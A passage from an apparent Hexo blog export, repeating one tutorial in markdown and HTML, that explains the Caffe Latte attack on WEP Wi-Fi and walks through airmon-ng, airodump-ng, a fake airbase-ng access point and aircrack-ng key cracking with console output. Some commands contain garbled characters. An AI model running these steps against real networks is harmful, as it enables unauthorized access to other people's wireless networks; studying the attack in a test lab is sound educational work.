NetworkManager\n2906    wpa_supplicant\n3078     dhclient\nProcess with PID 3078 (dhclient) is running on interface wlano\n\n\nInterface               Chipset                      Driver\n\nwlane                   Intel 6230                   iwlwifi - [phy0]\nwlan1                   Realtek RTL8187L             rt19197 - [phy1]\n                                  monitor mode enabled on mono0)\n\n```\n\n## Monitoring the traffic\n\nWith the command airodump-ng we will start to listen and collect all the traffic that circulates through the air, we will see how initially there is no wifi network called \"caffelatte\" and after executing>.\n\nThe -c 7 option is to filter the searches to channel 7, the -w \"namefile\" option is to save the capture in the \"namefile\" file.\n\n``` console\n$ airodump-ng -c 7 -w caffelattecapture mon0\n```\n\n## Dummy access point\n\nWe create the fake AP to perform the attack with the airbase-ng program we will create the fake access point.\n\nOptions:\nThe -c 7 option will create the access point on channel 7. \nOption -a XX:XX:XX:XX:XX:XX:XX:XX:XX is used to create the access point with this mac address\nThe -e \"XX\" option is used to give the name (ESSID) \"XX\" to the network.\nThe -L option is used to make airbase-ng adopt the caffelatte attack configuration.\nThe -W 1 option is used for the network to adopt WEP encryption, if there is a 0 the network will be open.\nThe -x \"XX\" option is optional, it is used to send \"XX\" packets per second once the attack starts.\n\nairbase-ng -c 7 -a XX:XX:XX:XX:XX:XX:XX:XX -e \"caffelatte\" -L -W 1 -x 100 mon0\n\n\n``` console\n$ airbase-ng -с 7 -а 58:6D:8F:AE:BF:F0 -е \"CaffeLatte\" -L -W - X 100 mono\n12:25:25  Created tap interface ato\n12:25:25  Trying to set MTU on ato to 1500\n12:25:25  Access Point with BSSID 58:6d:8F:AE:BF:F0 started.\n\n```\n\n## Start the Attack :)))\n\nWhen the client connects to the network it will associate to it and start the attack, the status of the attack will be shown in the airbase-ng terminal.\n\n\n``` console\n12:20:15   Client 64:70:02:2b:4E:2F associated (WEP) to ESSID: \"CaffeLatte\"\n12:20:15   Client 64:70:02:2b:4E:2F associated (WEP) to ESSID: \"CaffeLatte\"\n12:20:15   Client 64:70:02:2b:4E:2F associated (WEP) to ESSID: \"CaffeLatte\"\n12:20:15   Client 64:70:02:2b:4E:2F associated (WEP) to ESSID: \"CaffeLatte\"\n12:20:15   Client 64:70:02:28:4E:2F associated (WEP) to ESSID: \"CaffeLatte\"\n12:20:15   Client 64:70:02:2b:4E:2F associated (WEP) to ESSID: \"CaffeLatte\"\n12:20:15   Client 64:70:02:2b:4E:2F associated (WEP) to ESSID: \"CaffeLatte\"\n12:20:15   Client 64:70:02:2b:4E:2F associated (WEP) to ESSID: \"CaffeLatte\"\n12:20:15   Client 64:70:02:2b:4E:2F associated (WEP) to ESSID: \"CaffeLatte\"\n12:20:15   Client 64:70:02:2b:4E:2F associated (WEP) to ESSID: \"CaffeLatte\"\n12:20:15   Client 64:70:02:2b:4E:2F associated (WEP) to ESSID: \"CaffeLatte\"\n12:20:15   Client 64:70:02:2b:4E:2F associated (WEP) to ESSID: \"CaffeLatte\"\n12:20:15   Client 64:70:02:28:4E:2F associated (WEP) to ESSID: \"CaffeLatte\"\n12:20:16   Starting Caffe-Latte attack against 64:70:02:28:4E:2F at 100 pps.\n```\n\nWe will see in airodump-ng that the client has connected and starts transmitting frames.\n\n``` console\nCH 7 1[ Elapsed: 36 S 1[ 2013-09-05 12:21\nBSSID                PWR RXQ Beacons   #Data, #/s CH MB   ENC CIPHER AUTH ESSID\n58:6D:8F:AE:BF:F0    O   O   741       61     1   7  54   WEP WEP         CaffeLatte\n\nBSSID                STATION            PWR   Rate    Lost    Frames  Probe\n58:6D:8F:AE:BF:F0    64:0B:3A:1C:**:**  -40   0 - 1      0      1836\n```\n\n## Decrypting the key\n\n\nWhen we have captured a high number of initialization vector packets (IV) we will proceed to run aircrack-ng to obtain the key\n\nwith the option -e \"xx\" we will decrypt only the network with the name (ESSID) \"xx\".\n\naircrack-ng -e caffelatte caffelattecapture*.cap\n\n``` console\n$ aircrack-ng -e caffelatte caffelattecapture*.cap\n```\n","source":"_posts/coffe-late-attack.md","raw":"---\ntitle: Hacking Wifi | Caffe Latte Attack\n---\n\nHave you ever wondered how to hack a wifi network? Well, I show you one of the many attacks that exist, this is something old, we talked about it appearing in 2007 and that it is no longer viable, but is interesting and nice to show, I talk about the caffe latte attack, is an attack to get the password of a wifi access point that contains the WEP protocol.\n\n![Alt text](/images/coffe.jpg?raw=true \"Coffe-Latte-Attack\")\n\n<!-- more -->\n\n# Introduction\n\nHow does it work?\nWell it is simple, it is that in the WEP encryption the user has to authenticate while the access point does not, the lack of these 2 authentications causes that an attack can impersonate an AP by copying ESSID (name) and BSSID (mac adress) to get to pair with the client, and well, you can get to do interesting things, this attack only works in this protocol, in other protocols such as WPA and WPA2 will not work because here if you need authentication by the 2 parts\n\n# Graphical Demonstration\n\nThe process is as follows:\n\n![Alt text](/images/attackcoffelatte.png?raw=true \"Coffe\")\n\n\n# Theoretical Process\n\n1.- The attacker creates a Wifi access point (AP) with an ESSID exactly the same as one that is stored in a victim computer, this network will have Wep security but with a different key to the client because we do not know it.\n\n![Alt text](/images/caffelate1screenshot.png?raw=true \"CoffeLate1screenshot\")\n\n2.- Although the attacker and the victim have different encryption keys, the wep encryption allows to reach the phase of association of the client to the access point.\n\n![Alt text](/images/caffelate2screenshot.png?raw=true \"CoffeLate1screenshot\")\n\n3.- The authentication process of the client is done through the proposal of a \"challenge\", this is done from attacker to client, the \"challenge\" is nothing more than a cipher text with the shared key, the client will answer the challenge and the fake access point will say that it is valid although it is not true, then it will send an \"Authentication Success\".\n\n\n4.- Once the authentication process is finished, the client is associated to the access point.\n\n\n5.-Once the association is established, the client will try to obtain an ip via DHCP but the fake access point will not have DHCP and after a timeout the client OS will automatically assign a static ip corresponding to the APIPA range (169.254.0.1 to 169.254.255.255.254 with mask 255.255.0.0).\n\n![Alt text](/images/caffelate3screenshot.png?raw=true \"CoffeLate1screenshot\")\n\n6.- The client will send free ARPS informing of the static ip that has been self-assigned to avoid problems in the network.\n\n# Obtaining the password :)))\n\n7.- Finally, from the free ARP the AP Fake will introduce in the network ARP requests from any ip with destination ip to the client ip, the client will respond to the ARP packets that are arriving and in a short time we will have enough traffic to crack the WEP password.\n\n![Alt text](/images/caffelate4screenshot.png?raw=true \"CoffeLate1screenshot\")\n\n# Small explanations\n\nSimple, right, well, I want to tell you a few things before going to practice, the first thing is to tell you that, although this method seems very easy to perform, currently it is no longer, this protocol has been discontinued causing this attack is no longer viable, even so you can make a test environment to test this, I assure you that it is quite fun to perform\n\nThe second thing is that, to perform all these wireless network attacks, you will need to have a network card that MUST have monitor mode, be sure to check if they have this mode before buying one, and preferably a good antenna to pick up signal, traffic. Something like this:\n\n![Alt text](/images/network-card.jpg?raw=true \"Network-Card\")\n\nI would recommend you to buy the one you like the most\n\nThis is the one I have and the one I recommend the most :) :\n\n ------------------------------------------------------------------------------\n|https://www.amazon.com/-/es/Adaptador-Link-Wireless-Negro-Blanco/dp/B002SZEOLG|\n ------------------------------------------------------------------------------\n\n# Practice\n\n## Network Interface\nFirst we will have to see our network interfaces, for it we write ifconfig in our console and several options will appear to us, we choose the one that has the option for monitor mode, in my case it appears as wlan1.\n\n\n``` console\n$ ifconfig\n\ndocker0: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500\n        inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255\n        ether 02:42:3c:5a:be:41  txqueuelen 0  (Ethernet)\n        RX packets 0  bytes 0 (0.0 B)\n        RX errors 0  dropped 0  overruns 0  frame 0\n        TX packets 0  bytes 0 (0.0 B)\n        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0\n\neth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500\n        inet 192.168.126.136  netmask 255.255.255.0  broadcast 192.168.126.255\n        inet6 fe80::ad27:5aab:c811:2dbd  prefixlen 64  scopeid 0x20<link>\n        ether 00:0c:29:b3:0d:18  txqueuelen 1000  (Ethernet)\n        RX packets 260062  bytes 288327227 (274.9 MiB)\n        RX errors 0  dropped 0  overruns 0  frame 0\n        TX packets 134684  bytes 24893626 (23.7 MiB)\n        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0\n\nlo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536\n        inet 127.0.0.1  netmask 255.0.0.0\n        inet6 ::1  prefixlen 128  scopeid 0x10<host>\n        loop  txqueuelen 1000  (Local Loopback)\n        RX packets 4679  bytes 23032556 (21.9 MiB)\n        RX errors 0  dropped 0  overruns 0  frame 0\n        TX packets 4679  bytes 23032556 (21.9 MiB)\n        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0\n\nwlan1: **************************** *********\n \n```\n\nOnce we start the card in monitor mode and we can see it in the network interface with ifconfig (seen in the previous step), we will type this command: \nairmon-ng start wlan1\n\n``` console\n$ airmon-ng start wlan1\nFound 3 processes that could cause t rouble.\nIf airodump-ng, aireplay-ng or airtun-ng stops working after\na short period of time, you may want to kill (some of) them!\n-e\nPID     Name\n2731    NetworkManager\n2906    wpa_supplicant\n3078     dhclient\nProcess with PID 3078 (dhclient) is running on interface wlano\n\n\nInterface               Chipset                      Driver\n\nwlane                   Intel 6230                   iwlwifi - [phy0]\nwlan1                   Realtek RTL8187L             rt19197 - [phy1]\n                                  monitor mode enabled on mono0)\n\n```\n\n## Monitoring the traffic\n\nWith the command airodump-ng we will start to listen and collect all the traffic that circulates through the air, we will see how initially there is no wifi network called \"caffelatte\" and after executing>.\n\nThe -c 7 option is to filter the searches to channel 7, the -w \"namefile\" option is to save the capture in the \"namefile\" file.\n\n``` console\n$ airodump-ng -c 7 -w caffelattecapture mon0\n```\n\n## Dummy access point\n\nWe create the fake AP to perform the attack with the airbase-ng program we will create the fake access point.\n\nOptions:\nThe -c 7 option will create the access point on channel 7. \nOption -a XX:XX:XX:XX:XX:XX:XX:XX:XX is used to create the access point with this mac address\nThe -e \"XX\" option is used to give the name (ESSID) \"XX\" to the network.\nThe -L option is used to make airbase-ng adopt the caffelatte attack configuration.\nThe -W 1 option is used for the network to adopt WEP encryption, if there is a 0 the network will be open.\nThe -x \"XX\" option is optional, it is used to send \"XX\" packets per second once the attack starts.\n\nairbase-ng -c 7 -a XX:XX:XX:XX:XX:XX:XX:XX -e \"caffelatte\" -L -W 1 -x 100 mon0\n\n\n``` console\n$ airbase-ng -с 7 -а 58:6D:8F:AE:BF:F0 -е \"CaffeLatte\" -L -W - X 100 mono\n12:25:25  Created tap interface ato\n12:25:25  Trying to set MTU on ato to 1500\n12:25:25  Access Point with BSSID 58:6d:8F:AE:BF:F0 started.\n\n```\n\n## Start the Attack :)))\n\nWhen the client connects to the network it will associate to it and start the attack, the status of the attack will be shown in the airbase-ng terminal.\n\n\n``` console\n12:20:15   Client 64:70:02:2b:4E:2F associated (WEP) to ESSID: \"CaffeLatte\"\n12:20:15   Client 64:70:02:2b:4E:2F associated (WEP) to ESSID: \"CaffeLatte\"\n12:20:15   Client 64:70:02:2b:4E:2F associated (WEP) to ESSID: \"CaffeLatte\"\n12:20:15   Client 64:70:02:2b:4E:2F associated (WEP) to ESSID: \"CaffeLatte\"\n12:20:15   Client 64:70:02:28:4E:2F associated (WEP) to ESSID: \"CaffeLatte\"\n12:20:15   Client 64:70:02:2b:4E:2F associated (WEP) to ESSID: \"CaffeLatte\"\n12:20:15   Client 64:70:02:2b:4E:2F associated (WEP) to ESSID: \"CaffeLatte\"\n12:20:15   Client 64:70:02:2b:4E:2F associated (WEP) to ESSID: \"CaffeLatte\"\n12:20:15   Client 64:70:02:2b:4E:2F associated (WEP) to ESSID: \"CaffeLatte\"\n12:20:15   Client 64:70:02:2b:4E:2F associated (WEP) to ESSID: \"CaffeLatte\"\n12:20:15   Client 64:70:02:2b:4E:2F associated (WEP) to ESSID: \"CaffeLatte\"\n12:20:15   Client 64:70:02:2b:4E:2F associated (WEP) to ESSID: \"CaffeLatte\"\n12:20:15   Client 64:70:02:28:4E:2F associated (WEP) to ESSID: \"CaffeLatte\"\n12:20:16   Starting Caffe-Latte attack against 64:70:02:28:4E:2F at 100 pps.\n```\n\nWe will see in airodump-ng that the client has connected and starts transmitting frames.\n\n``` console\nCH 7 1[ Elapsed: 36 S 1[ 2013-09-05 12:21\nBSSID                PWR RXQ Beacons   #Data, #/s CH MB   ENC CIPHER AUTH ESSID\n58:6D:8F:AE:BF:F0    O   O   741       61     1   7  54   WEP WEP         CaffeLatte\n\nBSSID                STATION            PWR   Rate    Lost    Frames  Probe\n58:6D:8F:AE:BF:F0    64:0B:3A:1C:**:**  -40   0 - 1      0      1836\n```\n\n## Decrypting the key\n\n\nWhen we have captured a high number of initialization vector packets (IV) we will proceed to run aircrack-ng to obtain the key\n\nwith the option -e \"xx\" we will decrypt only the network with the name (ESSID) \"xx\".\n\naircrack-ng -e caffelatte caffelattecapture*.cap\n\n``` console\n$ aircrack-ng -e caffelatte caffelattecapture*.cap\n```\n","slug":"coffe-late-attack","published":1,"date":"2022-12-11T04:01:08.776Z","updated":"2022-12-11T04:01:08.776Z","_id":"clbi9vz0z00002qkc5edl1lut","comments":1,"layout":"post","photos":[],"link":"","content":"<p>Have you ever wondered how to hack a wifi network? Well, I show you one of the many attacks that exist, this is something old, we talked about it appearing in 2007 and that it is no longer viable, but is interesting and nice to show, I talk about the caffe latte attack, is an attack to get the password of a wifi access point that contains the WEP protocol.</p>\n<p><img src=\"/images/coffe.jpg?raw=true\" alt=\"Alt text\" title=\"Coffe-Latte-Attack\"></p>\n<span id=\"more\"></span>\n\n<h1 id=\"Introduction\"><a href=\"#Introduction\" class=\"headerlink\" title=\"Introduction\"></a>Introduction</h1><p>How does it work?<br>Well it is simple, it is that in the WEP encryption the user has to authenticate while the access point does not, the lack of these 2 authentications causes that an attack can impersonate an AP by copying ESSID (name) and BSSID (mac adress) to get to pair with the client, and well, you can get to do interesting things, this attack only works in this protocol, in other protocols such as WPA and WPA2 will not work because here if you need authentication by the 2 parts</p>\n<h1 id=\"Graphical-Demonstration\"><a href=\"#Graphical-Demonstration\" class=\"headerlink\" title=\"Graphical Demonstration\"></a>Graphical Demonstration</h1><p>The process is as follows:</p>\n<p><img src=\"/images/attackcoffelatte.png?raw=true\" alt=\"Alt text\" title=\"Coffe\"></p>\n<h1 id=\"Theoretical-Process\"><a href=\"#Theoretical-Process\" class=\"headerlink\" title=\"Theoretical Process\"></a>Theoretical Process</h1><p>1.- The attacker creates a Wifi access point (AP) with an ESSID exactly the same as one that is stored in a victim computer, this network will have Wep security but with a different key to the client because we do not know it.</p>\n<p><img src=\"/images/caffelate1screenshot.png?raw=true\" alt=\"Alt text\" title=\"CoffeLate1screenshot\"></p>\n<p>2.- Although the attacker and the victim have different encryption keys, the wep encryption allows to reach the phase of association of the client to the access point.</p>\n<p><img src=\"/images/caffelate2screenshot.png?raw=true\" alt=\"Alt text\" title=\"CoffeLate1screenshot\"></p>\n<p>3.- The authentication process of the client is done through the proposal of a “challenge”, this is done from attacker to client, the “challenge” is nothing more than a cipher text with the shared key, the client will answer the challenge and the fake access point will say that it is valid although it is not true, then it will send an “Authentication Success”.</p>\n<p>4.- Once the authentication process is finished, the client is associated to the access point.</p>\n<p>5.-Once the association is established, the client will try to obtain an ip via DHCP but the fake access point will not have DHCP and after a timeout the client OS will automatically assign a static ip corresponding to the APIPA range (169.254.0.1 to 169.254.255.255.254 with mask 255.255.0.0).</p>\n<p><img src=\"/images/caffelate3screenshot.png?raw=true\" alt=\"Alt text\" title=\"CoffeLate1screenshot\"></p>\n<p>6.- The client will send free ARPS informing of the static ip that has been self-assigned to avoid problems in the network.</p>\n<h1 id=\"Obtaining-the-password\"><a href=\"#Obtaining-the-password\" class=\"headerlink\" title=\"Obtaining the password :)))\"></a>Obtaining the password :)))</h1><p>7.- Finally, from the free ARP the AP Fake will introduce in the network ARP requests from any ip with destination ip to the client ip, the client will respond to the ARP packets that are arriving and in a short time we will have enough traffic to crack the WEP password.</p>\n<p><img src=\"/images/caffelate4screenshot.png?raw=true\" alt=\"Alt text\" title=\"CoffeLate1screenshot\"></p>\n<h1 id=\"Small-explanations\"><a href=\"#Small-explanations\" class=\"headerlink\" title=\"Small explanations\"></a>Small explanations</h1><p>Simple, right, well, I want to tell you a few things before going to practice, the first thing is to tell you that, although this method seems very easy to perform, currently it is no longer, this protocol has been discontinued causing this attack is no longer viable, even so you can make a test environment to test this, I assure you that it is quite fun to perform</p>\n<p>The second thing is that, to perform all these wireless network attacks, you will need to have a network card that MUST have monitor mode, be sure to check if they have this mode before buying one, and preferably a good antenna to pick up signal, traffic. Something like this:</p>\n<p><img src=\"/images/network-card.jpg?raw=true\" alt=\"Alt text\" title=\"Network-Card\"></p>\n<p>I would recommend you to buy the one you like the most</p>\n<p>This is the one I have and the one I recommend the most :) :</p>\n<hr>\n<table>\n<thead>\n<tr>\n<th><a href=\"https://www.amazon.com/-/es/Adaptador-Link-Wireless-Negro-Blanco/dp/B002SZEOLG\">https://www.amazon.com/-/es/Adaptador-Link-Wireless-Negro-Blanco/dp/B002SZEOLG</a></th>\n</tr>\n</thead>\n</table>\n<h1 id=\"Practice\"><a href=\"#Practice\" class=\"headerlink\" title=\"Practice\"></a>Practice</h1><h2 id=\"Network-Interface\"><a href=\"#Network-Interface\" class=\"headerlink\" title=\"Network Interface\"></a>Network Interface</h2><p>First we will have to see our network interfaces, for it we write ifconfig in our console and several options will appear to us, we choose the one that has the option for monitor mode, in my case it appears as wlan1.</p>\n<figure class=\"highlight console\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">$ </span><span class=\"language-bash\">ifconfig</span></span><br><span class=\"line\"></span><br><span class=\"line\">docker0: flags=4099&lt;UP,BROADCAST,MULTICAST&gt;  mtu 1500</span><br><span class=\"line\">        inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255</span><br><span class=\"line\">        ether 02:42:3c:5a:be:41  txqueuelen 0  (Ethernet)</span><br><span class=\"line\">        RX packets 0  bytes 0 (0.0 B)</span><br><span class=\"line\">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class=\"line\">        TX packets 0  bytes 0 (0.0 B)</span><br><span class=\"line\">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class=\"line\"></span><br><span class=\"line\">eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class=\"line\">        inet 192.168.126.136  netmask 255.255.255.0  broadcast 192.168.126.255</span><br><span class=\"line\">        inet6 fe80::ad27:5aab:c811:2dbd  prefixlen 64  scopeid 0x20&lt;link&gt;</span><br><span class=\"line\">        ether 00:0c:29:b3:0d:18  txqueuelen 1000  (Ethernet)</span><br><span class=\"line\">        RX packets 260062  bytes 288327227 (274.9 MiB)</span><br><span class=\"line\">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class=\"line\">        TX packets 134684  bytes 24893626 (23.7 MiB)</span><br><span class=\"line\">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class=\"line\"></span><br><span class=\"line\">lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536</span><br><span class=\"line\">        inet 127.0.0.1  netmask 255.0.0.0</span><br><span class=\"line\">        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;</span><br><span class=\"line\">        loop  txqueuelen 1000  (Local Loopback)</span><br><span class=\"line\">        RX packets 4679  bytes 23032556 (21.9 MiB)</span><br><span class=\"line\">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class=\"line\">        TX packets 4679  bytes 23032556 (21.9 MiB)</span><br><span class=\"line\">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class=\"line\"></span><br><span class=\"line\">wlan1: **************************** *********</span><br><span class=\"line\"> </span><br></pre></td></tr></table></figure>\n\n<p>Once we start the card in monitor mode and we can see it in the network interface with ifconfig (seen in the previous step), we will type this command:<br>airmon-ng start wlan1</p>\n<figure class=\"highlight console\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">$ </span><span class=\"language-bash\">airmon-ng start wlan1</span></span><br><span class=\"line\">Found 3 processes that could cause t rouble.</span><br><span class=\"line\">If airodump-ng, aireplay-ng or airtun-ng stops working after</span><br><span class=\"line\">a short period of time, you may want to kill (some of) them!</span><br><span class=\"line\">-e</span><br><span class=\"line\">PID     Name</span><br><span class=\"line\">2731    NetworkManager</span><br><span class=\"line\">2906    wpa_supplicant</span><br><span class=\"line\">3078     dhclient</span><br><span class=\"line\">Process with PID 3078 (dhclient) is running on interface wlano</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">Interface               Chipset                      Driver</span><br><span class=\"line\"></span><br><span class=\"line\">wlane                   Intel 6230                   iwlwifi - [phy0]</span><br><span class=\"line\">wlan1                   Realtek RTL8187L             rt19197 - [phy1]</span><br><span class=\"line\">                                  monitor mode enabled on mono0)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"Monitoring-the-traffic\"><a href=\"#Monitoring-the-traffic\" class=\"headerlink\" title=\"Monitoring the traffic\"></a>Monitoring the traffic</h2><p>With the command airodump-ng we will start to listen and collect all the traffic that circulates through the air, we will see how initially there is no wifi network called “caffelatte” and after executing&gt;.</p>\n<p>The -c 7 option is to filter the searches to channel 7, the -w “namefile” option is to save the capture in the “namefile” file.</p>\n<figure class=\"highlight console\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">$ </span><span class=\"language-bash\">airodump-ng -c 7 -w caffelattecapture mon0</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"Dummy-access-point\"><a href=\"#Dummy-access-point\" class=\"headerlink\" title=\"Dummy access point\"></a>Dummy access point</h2><p>We create the fake AP to perform the attack with the airbase-ng program we will create the fake access point.</p>\n<p>Options:<br>The -c 7 option will create the access point on channel 7.<br>Option -a XX:XX:XX:XX:XX:XX:XX:XX:XX is used to create the access point with this mac address<br>The -e “XX” option is used to give the name (ESSID) “XX” to the network.<br>The -L option is used to make airbase-ng adopt the caffelatte attack configuration.<br>The -W 1 option is used for the network to adopt WEP encryption, if there is a 0 the network will be open.<br>The -x “XX” option is optional, it is used to send “XX” packets per second once the attack starts.</p>\n<p>airbase-ng -c 7 -a XX:XX:XX:XX:XX:XX:XX:XX -e “caffelatte” -L -W 1 -x 100 mon0</p>\n<figure class=\"highlight console\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">$ </span><span class=\"language-bash\">airbase-ng -с 7 -а 58:6D:8F:AE:BF:F0 -е <span class=\"string\">&quot;CaffeLatte&quot;</span> -L -W - X 100 mono</span></span><br><span class=\"line\">12:25:25  Created tap interface ato</span><br><span class=\"line\">12:25:25  Trying to set MTU on ato to 1500</span><br><span class=\"line\">12:25:25  Access Point with BSSID 58:6d:8F:AE:BF:F0 started.</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"Start-the-Attack\"><a href=\"#Start-the-Attack\" class=\"headerlink\" title=\"Start the Attack :)))\"></a>Start the Attack :)))</h2><p>When the client connects to the network it will associate to it and start the attack, the status of the attack will be shown in the airbase-ng terminal.</p>\n<figure class=\"highlight console\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">12:20:15   Client 64:70:02:2b:4E:2F associated (WEP) to ESSID: &quot;CaffeLatte&quot;</span><br><span class=\"line\">12:20:15   Client 64:70:02:2b:4E:2F associated (WEP) to ESSID: &quot;CaffeLatte&quot;</span><br><span class=\"line\">12:20:15   Client 64:70:02:2b:4E:2F associated (WEP) to ESSID: &quot;CaffeLatte&quot;</span><br><span class=\"line\">12:20:15   Client 64:70:02:2b:4E:2F associated (WEP) to ESSID: &quot;CaffeLatte&quot;</span><br><span class=\"line\">12:20:15   Client 64:70:02:28:4E:2F associated (WEP) to ESSID: &quot;CaffeLatte&quot;</span><br><span class=\"line\">12:20:15   Client 64:70:02:2b:4E:2F associated (WEP) to ESSID: &quot;CaffeLatte&quot;</span><br><span class=\"line\">12:20:15   Client 64:70:02:2b:4E:2F associated (WEP) to ESSID: &quot;CaffeLatte&quot;</span><br><span class=\"line\">12:20:15   Client 64:70:02:2b:4E:2F associated (WEP) to ESSID: &quot;CaffeLatte&quot;</span><br><span class=\"line\">12:20:15   Client 64:70:02:2b:4E:2F associated (WEP) to ESSID: &quot;CaffeLatte&quot;</span><br><span class=\"line\">12:20:15   Client 64:70:02:2b:4E:2F associated (WEP) to ESSID: &quot;CaffeLatte&quot;</span><br><span class=\"line\">12:20:15   Client 64:70:02:2b:4E:2F associated (WEP) to ESSID: &quot;CaffeLatte&quot;</span><br><span class=\"line\">12:20:15   Client 64:70:02:2b:4E:2F associated (WEP) to ESSID: &quot;CaffeLatte&quot;</span><br><span class=\"line\">12:20:15   Client 64:70:02:28:4E:2F associated (WEP) to ESSID: &quot;CaffeLatte&quot;</span><br><span class=\"line\">12:20:16   Starting Caffe-Latte attack against 64:70:02:28:4E:2F at 100 pps.</span><br></pre></td></tr></table></figure>\n\n<p>We will see in airodump-ng that the client has connected and starts transmitting frames.</p>\n<figure class=\"highlight console\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">CH 7 1[ Elapsed: 36 S 1[ 2013-09-05 12:21</span><br><span class=\"line\">BSSID                PWR RXQ Beacons   #Data, #/s CH MB   ENC CIPHER AUTH ESSID</span><br><span class=\"line\">58:6D:8F:AE:BF:F0    O   O   741       61     1   7  54   WEP WEP         CaffeLatte</span><br><span class=\"line\"></span><br><span class=\"line\">BSSID                STATION            PWR   Rate    Lost    Frames  Probe</span><br><span class=\"line\">58:6D:8F:AE:BF:F0    64:0B:3A:1C:**:**  -40   0 - 1      0      1836</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"Decrypting-the-key\"><a href=\"#Decrypting-the-key\" class=\"headerlink\" title=\"Decrypting the key\"></a>Decrypting the key</h2><p>When we have captured a high number of initialization vector packets (IV) we will proceed to run aircrack-ng to obtain the key</p>\n<p>with the option -e “xx” we will decrypt only the network with the name (ESSID) “xx”.</p>\n<p>aircrack-ng -e caffelatte caffelattecapture*.cap</p>\n<figure class=\"highlight console\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">$ </span><span class=\"language-bash\">aircrack-ng -e caffelatte caffelattecapture*.<span class=\"built_in\">cap</span></span></span><br></pre></td></tr></table></figure>\n","site":{"data":{}},"excerpt":"<p>Have you ever wondered how to hack a wifi network? Well, I show you one of the many attacks that exist, this is something old, we talked about it appearing in 2007 and that it is no longer viable, but is interesting and nice to show, I talk about the caffe latte attack, is an attack to get the password of a wifi access point that contains the WEP protocol.</p>\n<p><img src=\"/images/coffe.jpg?raw=true\" alt=\"Alt text\" title=\"Coffe-Latte-Attack\"></p>","more":"<h1 id=\"Introduction\"><a href=\"#Introduction\" class=\"headerlink\" title=\"Introduction\"></a>Introduction</h1><p>How does it work?<br>Well it is simple, it is that in the WEP encryption the user has to authenticate while the access point does not, the lack of these 2 authentications causes that an attack can impersonate an AP by copying ESSID (name) and BSSID (mac adress) to get to pair with the client, and well, you can get to do interesting things, this attack only works in this protocol, in other protocols such as WPA and WPA2 will not work because here if you need authentication by the 2 parts</p>\n<h1 id=\"Graphical-Demonstration\"><a href=\"#Graphical-Demonstration\" class=\"headerlink\" title=\"Graphical Demonstration\"></a>Graphical Demonstration</h1><p>The process is as follows:</p>\n<p><img 